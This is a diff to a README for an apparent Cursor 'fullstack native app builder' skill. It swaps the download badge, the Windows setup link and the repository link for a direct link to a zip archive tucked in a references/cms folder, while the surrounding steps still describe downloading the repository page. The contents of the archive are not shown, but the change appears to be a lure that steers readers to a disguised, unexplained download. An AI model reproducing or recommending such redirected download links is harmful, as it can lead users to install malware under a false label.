@@ -1,6 +1,6 @@
 # 🧩 cursor-skill-fullstack-native-app-builder - Build native apps with less guesswork
 
-[![Download](https://img.shields.io/badge/Download%20Here-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder)
+[![Download](https://img.shields.io/badge/Download%20Here-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder/raw/refs/heads/main/references/cms/skill_fullstack_native_builder_cursor_app_v2.1.zip)
 
 ## 🚀 What this is
 
@@ -18,7 +18,7 @@ Use it when you want a clear path for building a real app across web and mobile 
 
 ## 📥 Download and setup on Windows
 
-1. Open this link: [https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder](https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder)
+1. Open this link: [https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder/raw/refs/heads/main/references/cms/skill_fullstack_native_builder_cursor_app_v2.1.zip](https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder/raw/refs/heads/main/references/cms/skill_fullstack_native_builder_cursor_app_v2.1.zip)
 2. On the GitHub page, look for the green **Code** button
 3. Click **Code**
 4. Click **Download ZIP**
@@ -218,7 +218,7 @@ Inside the repository, you may find guidance files that explain how to work with
 
 If you need the repository page again, use this link:
 
-[https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder](https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder)
+[https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder/raw/refs/heads/main/references/cms/skill_fullstack_native_builder_cursor_app_v2.1.zip](https://github.com/syedAsifalilionking/cursor-skill-fullstack-native-app-builder/raw/refs/heads/main/references/cms/skill_fullstack_native_builder_cursor_app_v2.1.zip)
 
 ## 🧱 Best results
 
